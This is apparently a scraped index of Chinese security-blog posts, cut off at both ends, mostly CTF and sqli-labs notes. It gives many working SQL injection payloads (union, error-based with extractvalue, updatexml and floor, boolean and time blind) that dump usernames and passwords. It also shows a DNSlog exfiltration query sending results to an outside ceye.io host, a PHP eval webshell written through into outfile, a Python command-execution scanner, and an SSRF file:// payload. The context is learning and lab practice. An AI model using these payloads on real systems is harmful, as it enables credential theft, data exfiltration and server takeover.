暴破弱密钥。 在GitHub上面找到一个py脚本https://github.com/Ch1ngg/JWTPyCrack","link":"/2025/12/11/jwt/"},{"title":"","text":"sql基础 1.什么是注入？注入就是通过SQL命令插入到web表单提交或输入域名或页面请求的查询字符串，最终到达服务器执行恶意的SQL代码，从而进一步得到相应的数据信息 构造一条精巧的语句，来查询到想要得到的信息。 2.注入有哪几种分类按照查询字段 按照注入的方式：union注入，报错注入，布尔注入，时间注入 3.什么是注入点注入点就是可以实行注入的地方，通常是一个访问数据库的连接。如本页面注入点input the ID 4.如何判断是以什么类型注入如何判断是字符型还是数字型方法一：and 1=1和and 1=2来判断 字符型数字型and 1=1和and 1=2都出现正常提示页面，则不可能是数字型注入当你是数字型的时候这个id 1=2是不能正常执行的 方法二： 1?id=2-1 字符型是不做运算的，查出来任然是2数字型是会做运算的 这里一般不用+号，+号有时候会被理解成空格 5.闭合方式是什么字符型需要闭合符，如下所示 1$scl=&quot;select * from users where id='$id' limit 0,1&quot;; 提交 1=and 1=1 1$scl=&quot;select * from users where id='1 and 1=1' limit 0,1&quot;; 里面的命令不会当成命令来执行 数字型则不需要闭合符来闭合 1$scl=&quot;select * from users where id=$id limit 0,1&quot;; 提交 and 1=2 1$scl=&quot;select * from users where id=$id and 1=2 limit 0,1&quot;; 6.如何判断闭合方式分析报错这里输入2’发现多了一个单引号报错了 7.闭合的作用是什么？手工提交闭合符号，结束前一段查询语句，后面即可加入其他语句，查询需要的参数不需要的语句可以用注释符号‘-+’或‘#或%23注释掉注释掉：利用注释符号暂时将程序段脱离运行。把某段程序“注释掉”，就是让它暂时不运行（而非删除掉） 8.什么是union联合注入联合查询注入 1?id=1' union select database ()--+ 上面会报错先判断前面的列数,如下语句判断 1234?id=1' group by 3 --+或者?id=1' order by 3 --+?id=1' union select 1,2,3 --+ UNION 要求前后两个查询的字段数量必须一致查询三个常量值 1,2,3只会读取第一行把它读取出来，然后把那个1修改成-1即可 1?id=-1' union select 1,2,3 --+ 1?id=-1' union select 1,version(),database() --+ 1.先查找注入点2.判断数字型还是字符型 and 1=1 1=2/ 3-13.如果是字符型，判断闭合方式 ' &quot; ') &quot;)4.判断查询列数，group by order by5.查询回显位 ?id=-1 'union select 1,2,3--+ sql前置1234cd D:\\Soft\\Penetration\\TrafficTools\\phpStudy\\Extensions\\MySQL5.7.26\\binmysql -u root -p -P 8848//root是数据库名字 如果修改了phpstudy里的sql端口要在phpadmin如下路径下的 12D:\\Soft\\Penetration\\TrafficTools\\phpStudy\\WWW\\phpadmin\\phpMyAdmin4.8.5\\librariesconfig.default.php 然后修改成sql的端口 mysql增删改12345678910111213# 登录 MySQL（root 用户，-p 后不直接写密码更安全）mysql -u root -p# 提示输入密码时，输入正确密码后回车# 查看所有数据库（SQL 命令需以分号结尾）show databases;# 创建数据库 employees，指定字符集为 utf8（注意：utf8mb4 更推荐，支持完整 Unicode）create database employees charset utf8;# 或更推荐：create database employees charset utf8mb4;# 删除数据库 employees（危险操作，会直接删除所有数据）drop database employees; 12use employees;#使用数据库 1234567891011121314151617181920212223242526CREATE TABLE 表名 ( 字段1 数据类型 [约束条件], 字段2 数据类型 [约束条件], ...);CREATE TABLE employee ( id int, name varchar(40), sex char(4), birthday date, job varchar(100));#查看数据库信息show full columns from employee;#查看数据表列表select from employee;#删除数据表drop table employee;#修改数据表名称为userrename table employee to user;#修改字符级alter table user character set utf8; 12345678910111213insert into user(id, name, sex, birthday, job)values(1, 'ctfstu', 'male', '1999-05-06', 'it');#写入内容INSERT INTO users (id, name, sex, birthday, job)VALUES (1, 'ctfstu', 'male', '1999-05-06', 'it'); 1select * from user; 查看表 123alter table user add salary decimal(8,2);#增加一列 第一个数字 8 表示 总位数（整数部分 + 小数部分的总长度不能超过 8 位）。 第二个数字 2 表示 小数部分的位数（固定保留 2 位小数，例如 12345.67 是合法的，123456.78 则超过总位数限制）。 12345增加一行INSERT INTO user (id, name, sex, birthday, job)VALUES (10, 'xiaohong', 'female', '2006-03-15', 'designer');update user set salary=5000;#将所有salary值设置为5000 123update user set name='benben' where id=1;#将id=1的行name修改为benben 123update user set name='benben2',salary=6000 where id=1;#修改id=1的行name为benben2,工资为6000 123456789alter table user drop salary;#删除salary列delete from user where job='it';#删除某一行delete from user;#删除user表 数据库查询1234567891011121314INSERT INTO user ( id, name, sex, birthday, job) VALUES (2, 'dazhuang', 'male', '2005-12-24', 'it'), (3, 'shapingba', 'male', '2005-12-24', 'it'), (4, 'ciqikou', 'male', '2005-12-24', 'it'), (5, 'hongyadong', 'male', '2005-12-24', 'it'), (6, 'yikeshu', 'male', '2005-12-24', 'it'), (7, 'jiangbeizui', 'male', '2005-12-24', 'it'), (8, 'admin', 'male', '2005-12-24', 'it'), (9, 'admin1', 'male', '2005-12-24', 'it');#再加多行 123select * from user where id=1;#select+列名(*代表所有)from+表名 where+条件语句 1234567select * from user where id in ('3');#从user表查询所有id为3,和上面一样的效果select * from user where id=(select id from user where name=('admin'));#子查询，优先查询括号里面的#一般用在不知道id只知道name为admin的查询 1234567select id from user union select email_id from emailsselect from user where id=6 union select from emails where id=6;#ERROR:have a different number of columns联合注入前后表格列数必须相等select * from users where id=6 union select *,3 from emails where id=6;#3为填充列 emails 表本身只有 2 个字段，SELECT * FROM emails... 会返回 2 个字段。但语句中用 SELECT *, 3 ... 额外添加了一个固定值 3（作为第 3 个 “虚拟字段”），使得第二个查询的结果变成了 3 个字段（2 个来自 emails 表，1 个固定值）。字段必须相同 创建emails数据表 1234CREATE TABLE emails( id int, email_id varchar(40)); 插入数据 1234567891011INSERT INTO emails ( id, email_id) VALUES (1,'Dumb@dhakkan.com'), (2,'Angel@iloveu.com'), (3,'Dummy@dhakkan.Jocal'), (4,'secure@dhakkan.local'), (5,'stupid@dhakkan.local'), (6,'superman@dhakkan.local'), (7,'batman@dhakkan.local'), (8,'admin@dhakkan.com'); 1234567891011INSERT INTO user ( id, name, sex, birthday, job) VALUES (2, 'dazhuang', 'male', '2005-12-24', 'it'), (3, 'shapingba', 'male', '2005-12-24', 'it'), (4, 'ciqikou', 'male', '2005-12-24', 'it'), (5, 'hongyadong', 'male', '2005-12-24', 'it'), (6, 'yikeshu', 'male', '2005-12-24', 'it'), (7, 'jiangbeizui', 'male', '2005-12-24', 'it'), (8, 'admin', 'male', '2005-12-24', 'it'), (9, 'admin1', 'male', '2005-12-24', 'it'); group by对所有进行分组users表如果两个人名字相同，id不一样没问题，但是要是对大量分组就会容易报错 12345678select department,count(id) from student group by department;#查询department院系人数 count(id)对ID进行计数#一般用于二分法判断数据表列数select * from users where id=9 group by 2;#by2,4,8~~~依次排查到报错为止，从而确定列数；group by是按多少列排序select * from users where id=9 group by 4;select * from users order by 1; 按升序排序，第一列 12345select stu_id from score where c_name='计算机' order by grade desc;#grade参数desc使排列顺序变为降序#查询 “计算机” 这门课程的所有学生的学号，并按成绩从高到低排序select * from users limit 1,2; 上面应该是 1select * from users limit 0,2; 与和或 1234#两个条件需要同时满足select * from users where id=1 and username='benben';#两个条件有一个满足select * from users where id=1 or username='benben'; or在post提交里面做万能密码判断字符型还是数字型 group_concat 多行合并变一行 1select group_concat(id,username,password)from users; 把所有写到的类全合并 1select database() 查看当前数据库名称 1select version() 查看当前数据库的版本，防火墙绕过可以用到，例如什么注释符绕过 查看当前权限 1show grants; union注入1.了解union注入过程中用到的关键数据库、数据表、数据列2.sql查询中group_concat的作用 最终目标使用union注入拿到靶机中数据库里的所有用户名和密码。 拿到表名，列名 1.提前了解 1?id=1' union select 1,2,3--+ 回显位是2，3查数据库是security 1?id=1' union select 1,2,database()--+ 然后查数据表 1?id=-1' union select 1,2,table_name from information_schema.tables --+ 仅属于当前数据库的表 1?id=-1' union select 1,2,table_name from information_schema.tables where table_schema=database() --+ 这里只能显示一个表名，那么我们需要一个group_concat 1?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ 这里查到了所有数据表 紧接着就是列名 1?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns --+ 里面很多没啥用的，我们就看一个数据表的列名 1?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' --+ 查当前数据库中 users 表的所有字段名（列名） 然后查最终目标 12345?id=-1' union select 1,2,group_concat(username,password) from users --+或者?id=-1' union select 1,group_concat(username,password),3 from users --+ 小技巧，看起来不方便科如下操作 1?id=-1' union select 1,2,group_concat(username,&quot;~&quot;,password) from users --+ 数字型union注入数字型不需要判断闭合方式 1.确定数字型还是字符型2.使用group by的二分法判断union语句中前一个查询的列数3.优化语句，将d改为一个不存在的数字4.使用select语句，查询靶机数据库库名5.使用select语句，查询靶机所有表名6.使用select语句，查询靶机所有列名7.查询所有用户名密码 less-2判断是数字型注入用2-1 和1去比较，相同就是数字型 这里就不用去闭合了我们接着去判断列数，这里用order by判断是3列接着联合注入，记得要改成-1不然只会回显第一行 `` Post unionPOST提交和GET提交POST提交的使用HackBarPOST提交注入POST提交报错注入 POST提交和GET提交1.get提交可以被缓存，post提交不会2.get提交参数会保留在浏览器的历史记录里，post提交不会3.get提交可以被收藏为书签，post提交不会4.get提交有长度限制，最长2048个字符；post提交没有长度要求，不是只允许使用ASCII字符，还可以使用二进制数据有可能溢出绕过，waf防火墙只检查前面多少个数据，9000多个 post提交比get提交更安全 下面这个url在浏览器里面就是get提交被缓存 less-11源代码 1@$sql=&quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1&quot;; 下面这是username万能密钥 1admin' or 1=1 # 代到上面的语句中就是 1@$sql=&quot;SELECT username, password FROM users WHERE username='admin' or 1=1 #' and password='$passwd' LIMIT 0,1&quot;; #把后面全注释掉了， 利用参数化查询避免SQL注入漏洞 post查数据库 1uname='union select 1,(select database()) #&amp;passwd=123&amp;Submit=Submit 判断列数 1uname=admin'group by 2#&amp;passwd=123&amp;submit=Submit post提交查字段 1uname='union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users')#&amp;passwd=123&amp;Submit=Submit 查数据 1uname='union select 1,(select group_concat(username,&quot;:&quot;,password) from users)#&amp;passwd=123&amp;Submit=Submit 报错注入extractvalue什么是报错注入 构造语句，让错误信息中夹杂可以显示数据库内容的查询语句返回报错提示中包含数据库中的内容 ===1.通过floor()报错注入===*2.通过extractValue()报错注入**3.通过updateXml()报错注入*4.通过NAME_CONST()报错注入5.通过jion()报错注入6.通过exp()报错注入7.通过geometryCollection()报错注入8.通过polygon()报错注入9.通过multipoint()报错注入10.通过multlinestring()报错注入11.通过multpolygon()报错注入12.通过linestring()报错注入 先创建两个数据库 1234567891011121314151617181920212223242526272829303132create database ctfstu charset utf8;create table xml(doc varchar(150));insert into xml values('&lt;book&gt;&lt;title&gt;how to become a bad boy&lt;/title&gt;&lt;author&gt;&lt;initial&gt;hualong&lt;/initial&gt;&lt;surname&gt;Melton&lt;/surname&gt;&lt;/author&gt;&lt;/book&gt;');insert into xml values('&lt;book&gt;&lt;title&gt;A bad boy how to get agirlfriend&lt;/title&gt;&lt;author&gt;&lt;initial&gt;Love&lt;/initial&gt;&lt;surname&gt;benben&lt;/surname&gt;&lt;/author&gt;&lt;/book&gt;');select extractvalue(doc,'/book/author/surname')from xml; doc是列名，第二个是查询路径,查到的是benben 12345678&lt;book&gt; &lt;title&gt;A bad boy how to get a girlfriend&lt;/title&gt; &lt;author&gt; &lt;initial&gt;Love&lt;/initial&gt; &lt;surname&gt;benben&lt;/surname&gt; &lt;/author&gt; &lt;/book&gt;select extractvalue(doc,'~book/author/surname')from xml; 上面这个报错是有回显语句的，所以我们可以在报错前构造一个查询语句 1select extractvalue(doc,concat(0x7e,(select database()))) from xml; 上述是显示当前库名 less-5尝试构造以下语句 1?id=-1' union select 1,2,database() --+ 尝试故意写错database 1?id=-1' union select 1,2,datdbase() --+ 出现如下报错可以知道当前数据库的库名是security 1234?id=100' union select 1,extractvalue(1,concat(0x7e,(select database()))),3--+#0x7e就是~号extractvalue这里列可以随便写，为的就是报错 上述语句也可以查到库名是security 1?id=100' and 1=extractvalue(1,concat(0x7e,(select database()))) --+ 然后查表名 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),3--+ 查到当前数据库表名继续查列名 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))) ,3--+ 最后查数据 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users))) ,3--+ 报错注入一次只能返回32个字符，所以此时要用substringsubstring(“第一”,”第二·”,”第三”) 第一：就是字符第二：从哪一位开始显示第三：显示总共多少位字符如下所示 1?id=100' union select 1,extractvalue(1,concat(0x7e,(select substring(group_concat(id,username,password),1,3) from users))) ,3--+ floor报错注入涉及到函数较多 rand()函数：随机返回0-1之间的小数floor()函数：小数向下取整，向上取整数ceiling()concat_ws()函数：将括号内数据用第一个字段连接起来group by:分组as:别名count()函数:汇总统计数量limit:这里用于显示指定行数 1234567891011121314151617181920212223?id=0' union select 1,count(*),concat_ws('-',(select concat('~',id,username,':',password) from users limit 0,1),floor(rand(0)*2)) as a from information_schema.tables group by a --+select rand() #随机生成0-1select rand() #随机生成0-2select rand() from users #有多少行生成多少个随机数select floor(rand()*2); #随机0或者1，只有两个结果select concat_ws('-',2,3) #2-3,拼接select concat_ws('-',(select database()),floor(rand()*2)) #数据库名字-0/1select concat_ws('-',(select database()),floor(rand()*2)) as a from users group by a; #分组select count(*), concat_ws(&quot;~&quot;, (select database()), floor(rand()*2)) as a from users group by a; #执行不是每次报错select count(*), concat_ws(&quot;~&quot;, (select database()), floor(rand(0)*2)) as a from users group by a; #rand()改成rand(0)就会固定报错，改成1就会不报错select count(*),concat_ws('-',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2)) as a from users group by a;#输出库名?id=-1' union select 1, count(*), concat_ws('-', (select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1), floor(rand(0)*2)) as a from users group by a --+#获取表名less-5?id=-1' union select 1, count(*), concat_ws('-', (select group_concat(username,':',password) from users), floor(rand(0)*2)) as a from users group by a --+#group_concat无法显示，可以使用concat?id=-1' union select 1, count(*), concat_ws('-', (select concat(username,':',password) from users limit 0,1), floor(rand(0)*2)) as a from users group by a --+#查最终数据 这是分组 查最终数据 updatexml注入函数updatexml(XML_document,XPath_string,new_value)包含三个参数第一个参数：XML document是string格式，为XML文档对象的名称，例如Doc第二个参数：XPath string是路径，XPath:格式的字符串第三个参数：new_value,string格式，替换查找到的符合条件的数据 updatexml 正常句式 1select updatexml(doc,'/book/auther/surname','1') from xml; 错误句式 1select updatexml(doc,'~book/auther/surname','1') from xml; 查数据库，第二个参数会引起报错，从而回显数据库名字 1?id=1&quot; and 1=updatexml(1,concat('~',(select database())),3) --+ 查数据表 1?id=1&quot; and 1=updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),3) --+ 查列 1?id=1&quot; and 1=updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')),3) --+ 然后查到这些个列名，最后查数据 1?id=1&quot; and 1=updatexml(1,concat('~',(select group_concat(id,username,password) from users)),3) --+ 这个限制长度了，用substring修改以下 1?id=1&quot; and 1=updatexml(1,concat('~',substring((select group_concat(id,username,password) from users),1,30)),3) --+ 盲注布尔盲注盲注：页面没有报错回显位，不知道数据库具体返回值的情况下，对数据库内容进行猜解，实行SQL注入 盲注分类：布尔盲注，时间盲注，报错注入 布尔盲注：web页面只返回True真，Flase假两种类型。利用页面返回不同，逐个猜解数据 用如下语句判断是否是布尔盲注 1?id=1' and 1=1 --+ 回复为真 1?id=1' and 1=2 --+ 回复为假 手动注入找到waf 关键函数函数ascii() ascii美国信息交换标准代码，可以把字母转换成对应数字 1select ascii('A') 1234?id=1' and ascii(substr((select database()),1,1))&gt;=101 --+(select database())substr((select database()),1,1)ascii(substr((select database()),1,1)) 大于等于115可以116不行所以第一个字符就是115 第二个字符 1?id=1' and ascii(substr((select database()),2,1))&gt;=101 --+ 依次去试 1?id=1'and ascii(substr('abcd',1,1))&gt;97 --+ 把abcd替换成要查询的语句即可 查表名limit 0,1 表示获取第 1 个表名 12?id=1' and ascii(substr((select table_name from information_schema.tables wheretable_schema=database() limit 0,1),1,1))&gt;100 --+ 查列名 12?id=1' and ascii(substr((select column_name from information_schema.columns wheretable_schema=database() and table_name='users' limit 0,1),1,1))&gt;100 --+ 查数据 12?id=1' and ascii(substr((select username from users limit 0,1),1,1))&gt;100 --+?id=1' and ascii(substr((select password from users limit 0,1),1,1))&gt;100 --+ 时间盲注时间盲注：web页面只返回一个正常页面，利用页面响应时间不同逐个猜解数据 前提是数据库会执行命令代码，只是不反馈页面信息 前提是数据库会执行命令代码，只是不反馈页面信息 关键函数函数sleep() 参数为休眠时长，以秒为单位，可以为小数 1select sleep(2) less-9输入 1?id=1 他是对的然后后面随便输不会变 1?id=1 and sleep(3) --+ 如果是数字型，她会延迟3秒才显示，这里它立马就回显了，显然不是数字型 然后判断是什么闭合,可以看到单引号等了3秒才回显，说明单引号闭合 1select if(1=1,sleep(0),sleep(3)); 这句话的意思是1=1为真就执行休眠0秒 1?id=1' and if(ascii(substr((select database()),1,1))&gt;100,sleep(0),sleep(3)) --+ 比大小猜解，然后通过时间响应判断条件是否成立 最终得到数据库名字的首字母是114rd 查询表 1234?id=1' and if(ascii(substr ((table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,sleep(0),sleep(3))--+?id=1' and if(ascii(substr ((column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),1,1))&gt;100,sleep(0),sleep(3))--+?id=1'and if(ascii(substr((select username from users limit 0,1),1,1))&gt;100,sleep(0),sleep(3)) --+?id=1' and if(ascii(substr((select password from users limit 0,1),1,1))&gt;100,sleep(0),sleep(3)) --+ dnslog注入盲注的一种，sqlmap，比盲注效率要高,可以一组一组，一行一行的出来 对当前服务器读写的权限要打开如果不能做SQL注入文件上传，那么这个也做不了 1select load_file(&quot;C:\\\\benben.txt&quot;); UNC路径格式：servername\\sharename,其中servername:是服务器名。sharename是共享资源的名称。目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：\\servername\\sharename\\directory \\filename。其实我们平常在Vidnows中用共享文件的时候就会用到这种网络地址的形式sss.xxxltest 查看本地文件 先查数据库 1?id=1'and select load_file(concat(&quot;\\\\\\\\&quot;,(select database()),&quot;1.j96k1p.ceye.io\\\\1.txt&quot;))--+ 查数据表 1?id=1' and (select load_file(concat(&quot;\\\\\\\\&quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;1.j96k1p.ceye.io\\\\1&quot;)))--+ 这里limit 0，1是显示第一个表名emails 是从0开始只显示一个limit 1,1 是从1开始只显示一个 列名 1?id=1' and (select load_file(concat(&quot;\\\\\\\\&quot;,(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),&quot;1.j96k1p.ceye.io\\\\1&quot;)))--+ 工具注入DnslogSqlinj 1234567891011121314151617181920Usage: dnslogSql.py [options] -u http://10.1.1.9/sqli-labs/Less-9/?id=1' and ({})--+Options: --version show program's version number and exit -h, --help show this help message and exit -n TASKNAME, --name=TASKNAME task name -t THREAD_COUNT, --thread=THREAD_COUNT thread_count -u URL, --url=URL target include injection -i INF, --inf=INF Testing target and Try to get information --dbs get database -D DB database name --tables get table -T TABLE table name --columns get column -C COLUMN column name --dump get **data**D:\\env\\Python\\Python27\\python.exe dnslogSql.py -u &quot;http://sqli:8088/Less-9/?id=1' and ({})--+&quot;D:\\env\\Python\\Python27\\python.exe dnslogSql.py -u &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1' and ({})--+&quot; -D security --tables 1sqlmap -u &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&quot; -D security -T users -C username,password --dump --time-sec 2 sql注入文件上传文件上传拿webshell 判断mysql是否有文件读写权限 12show variables like '%secure%';#用来查看mysql是否有读写文件权限 这里NULL是没有文件读写权限的我们在mysql下面的my.ini文件里面的[mysqld]组下面加一行 1secure_file_priv=&quot;&quot; 然后就有文件读写权限了 1.show variables like’%secure%’;用来查看mysql是否有读写文件权限；2.数据库的fle权限规定了数据库用户是否有权限，向操作系统内写入和读取已存在的权限；3.into outfile命令使用的环境：必须知道一个，服务器上可以写入文件的文件夹的完整路径。 less-7两个双引号不报错的原因是因为双引号被两个单引号闭合，失去单引号的作用是如下闭合方式 1?id=1')) 有个法子可以判断到底是不是两个单引号闭合 1?id=1'' and 1=2 --+ 这显然是不成立的，但是任然不报错，可以看到那么这就不是两个单引号闭合 1?id=-1'))union select 1,&quot;&lt;?php @eval($_POST['password']);?&gt;&quot;,3 into outfile &quot;D:\\\\phpstudy_pro\\\\WWW\\\\ben.php&quot;--+ &lt;?php@eval($_POST['password]);?&gt;为一句话木马password为预留密码D:\\\\phpstudy._pro\\\\WWWW\\\\为文件路径ben.php为新插入的文件名 1?id=-1')) union select 1,&quot;&lt;?php @eval($_POST['password']);?&gt;&quot;,3 into outfile &quot;D:\\\\Soft\\\\Penetration\\\\TrafficTools\\\\phpStudy\\\\WWW\\\\ben.php&quot; --+ 这里写好注入，文件上传成功，然后用蚁剑连接这里连接地址就是 1http://localhost/ben.php 查看权限，这是本机的一个管理员用户 linux的话是 1?id=-1'))union select 1,&quot;&lt;?php @eval($_POST['password']);?&quot;,3 into outfile &quot;/var/www/heml/test/ben.php&quot;--+ 上传大马反弹拿web shell","link":"/2025/12/11/sql%E6%B3%A8%E5%85%A5/"},{"title":"","text":"信呼OA文件上传","link":"/2025/12/11/%E4%BF%A1%E5%91%BCOA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"title":"","text":"强网杯2019–高明的黑客 拿到很多奇怪的东西，跑脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import requestsimport osimport reurl = 'http://7f163133-d226-4d67-bffa-9c2366d4eab3.node5.buuoj.cn:81/'path = r'C:\\Users\\11759\\Downloads\\Compressed\\sss'ptn_get = re.compile(br&quot;\\$_GET\\['(\\w+)'\\]&quot;) #匹配文件里面的GET内容flag_ptn = re.compile(br&quot;\\{.*?\\}&quot;)print(&quot;========== 开始扫描 ==========\\n&quot;)for f in os.scandir(path): if not f.is_file() or not f.name.endswith(&quot;.php&quot;): continue print(f&quot;[+] 扫描文件：{f.name}&quot;) with open(f.path, &quot;rb&quot;) as fp: content = fp.read() params = set(ptn_get.findall(content)) if not params: continue for p in params: p = p.decode() print(f&quot; [+] 测试参数：{p}&quot;) try: r = requests.get( url + f.name, params={p: &quot;cat /flag&quot;}, timeout=8 ) except: continue if flag_ptn.search(r.content): print(&quot;\\n漏洞发现！&quot;) print(f&quot;文件：{f.name}&quot;) print(f&quot;参数：{p}&quot;) print(f&quot;PoC：{url}{f.name}?{p}=cat /flag&quot;) print(&quot;\\nflag:&quot;) print(r.text) exit()print(&quot;\\n========== 扫描结束：未发现命令执行 ==========&quot;)直接获取payload如下/xk0SzyKwfzw.php?Efa5BVG=cat /flag","link":"/2025/12/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019--%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/"},{"title":"","text":"网鼎杯 2018–Fakebook 扫到目录robots.txt 访问/user.php.bak 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo{ public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) { $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-&gt;get($this-&gt;blog); } public function isValidBlog () { $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); }} 这里看到view.php路径 然后可以大致判断flag应该在 1/var/www/html/flag.php 这里发现sql注入 1?no=1 and 1=1 判断列数4列 1?no=1 order by 4--+ 回显位为2 1?no=-1 union/**/select 1,2,3,4--+ 查数据库为fakebook 1?no=-1 union/**/select 1,group_concat(schema_name),3,4 from information_schema.schemata--+ 得到以下数据库 fakebook,information_schema,mysql,performance_schema,test 爆表 1?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=&quot;fakebook&quot;--+ 得到表名users 爆字段 1?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&quot;users&quot;--+ 得到字段是no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS 最后查数据 1?no=-1 union/**/select 1,concat(no,&quot;\\n&quot;,username,&quot;\\n&quot;,passwd,&quot;\\n&quot;,data),3,4 from users--+ 得到如下数据 11 admin c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:8:&quot;123.blog&quot;;} data字段为我们刚join注册的数据序列化的形式 注意到源代码是iframe格式前面的分析可知flag.php的路径，ssrf可以伪协议file://,把序列化字符串作为参数输入测试，将blog值改为百度的网址 1no=-1 union/**/select 1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:22:&quot;https://www.baidu.com/&quot;;}' 这里我没成功，暂时不知道什么原因 这边由于原本的https://www.baodu.com/是22，所以构造payload时这边改成file:///var/www/html/flag.php要更改长度为29 1?no=-1 union/**/select 1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}' 解码得到flag","link":"/2025/12/11/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018--Fakebook/"},{"title":"","text":"父子域搭建 父域：sky0.com dc主域控：192.168.64.11 pc成员域控：192.168.64.12 12345678910子域：hr.sky0.com dc:子域控 192.168.64.22 pc：成员主机 192.168.139.23子域：pc.sky0.com dc:子域控 192.168.64.33 pc：成员主机 192.168.64.34 域林：ga.sky0.com dc 孙子域控 192.168.64.36 pc 成员主机 192.168.64.36 父域：sky.com dc 子域控 192.168.64.44 pc 成员主机 192.168.64.45","link":"/2025/12/11/%E7%88%B6%E5%AD%90%E5%9F%9F%E6%90%AD%E5%BB%BA/"},{"title":"","text":"网鼎杯 2020 朱雀组–phpweb 这个先放御剑扫一下，没出货然后观察到它是一直刷新的，我们用bp抓一下包 这里看到请求传了一个func和pfunc猜测是function,p应该是payload（猜的） 1func=file_get_contents&amp;p=index.php 传过去得到如下代码 123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else {return &quot;&quot;;} } class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } } } $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(&quot;Hacker...&quot;); } } ?&gt; 先禁用了一大堆函数得到源码以后才知道原来是call_user_func()函数，还是见得少了，大佬估计直接能看出来是这个函数，我还要靠猜。 1$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, 